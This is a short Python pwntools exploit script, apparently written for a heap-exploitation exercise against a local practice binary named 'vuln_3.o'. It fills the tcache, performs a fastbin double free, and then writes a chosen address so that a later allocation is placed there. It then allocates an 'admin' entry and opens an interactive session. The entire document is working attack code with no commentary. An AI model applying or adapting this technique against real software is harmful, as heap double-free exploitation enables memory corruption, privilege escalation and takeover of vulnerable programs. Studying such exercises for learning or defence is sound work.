from pwn import *

def malloc(name):
    p.sendlineafter('>> ','1 '+name)

def free(id):
    p.sendlineafter('>> ', '2 '+str(id))


p = process("./vuln_3.o")

gdb.attach(p)

for i in range(8):
    malloc('a')

malloc('a')
malloc('a')


for i in range(9):
    free(i-1)

free(8)
free(9)
free(8)

for i in range(8):
    malloc('a')

malloc('\x48\xc0\x04\x08')
malloc('1')
malloc('1')
p.sendlineafter('>> ','1 ' +'admin')


p.interactive()
